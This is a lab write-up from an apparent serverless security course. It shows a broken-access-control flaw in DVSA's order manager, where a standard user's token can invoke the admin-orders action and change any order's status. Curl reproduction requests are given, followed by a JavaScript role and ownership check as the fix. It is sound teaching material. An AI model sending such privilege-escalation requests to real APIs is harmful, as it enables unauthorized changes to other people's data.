# Lesson 5 · Broken Access Control

## Vulnerability Summary
`DVSA-ORDER-MANAGER` routes requests by the `action` field without checking whether the authenticated user is **authorized** to perform that action. A standard user can invoke admin-only operations (e.g., `admin-orders`) and modify any order in DynamoDB.

## Root Cause
The function authenticates users via JWT but **skips authorization**. It routes based solely on the `action` value — no role check, no ownership check. Any authenticated user can send any action string.

## AWS Components
| Component | Role |
|-----------|------|
| API Gateway `/order` | Entry point |
| Lambda (DVSA-ORDER-MANAGER) | Missing RBAC checks |
| Amazon DynamoDB (DVSA-ORDERS-DB) | Stores order status |

## Tools Used
- `curl`
- `jq`
- Browser DevTools
- AWS Console (DynamoDB)

## Reproduction Steps

### Step 1 — Log In and Capture Token
```bash
export API="https://<API-ID>.execute-api.us-east-1.amazonaws.com/Stage/order"
export TOKEN="<your_standard_user_token>"
```

### Step 2 — Get an Order ID
```bash
curl -s $API \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data '{"action":"orders"}' | jq
```
Copy an `order-id` from the response.

### Step 3 — Invoke Admin Action as Standard User
```bash
curl -X POST $API \
  -H "Content-Type: application/json" \
  -H "authorization: $TOKEN" \
  -d '{"action":"admin-orders","order-id":"<ORDER_ID>","status":"shipped"}'
```

### Step 4 — Verify in DynamoDB
- Navigate to **DynamoDB → Explore Items → DVSA-ORDERS-DB**
- Find the item by `order-id`
- Confirm `status` was changed to `shipped` without admin credentials

## Evidence
API returns `{"status":"ok","msg":"address updated"}` and DynamoDB confirms the unauthorized state change.

## Fix Summary
Add role-based and ownership-based checks in `order-manager.js`:

```javascript
// Extract identity from verified JWT
const userGroups = verifiedToken['cognito:groups'] || [];

// Block admin actions for non-admins
if (data.action === 'admin-orders') {
  if (!userGroups.includes('Admins')) {
    return { statusCode: 403,
      body: JSON.stringify({ message: 'Access denied: admin only' }) };
  }
}

// Block cross-user order access
if (data.action === 'get' || data.action === 'complete') {
  const order = await getOrderFromDB(data['order-id']);
  if (order.userId !== userIdentity) {
    return { statusCode: 403,
      body: JSON.stringify({ message: 'Access denied: not your order' }) };
  }
}
```

See [`/Codefix/Lesson05-Broken-Access-Control/`](../../Codefix/Lesson05-Broken-Access-Control/) for full patched code.

## Lessons Learned
**Authentication** (who you are) and **authorization** (what you are allowed to do) are two distinct controls that must both be enforced. In serverless architectures, role-based checks and ownership validation must be implemented at the **function level** — not assumed from the caller's identity alone.
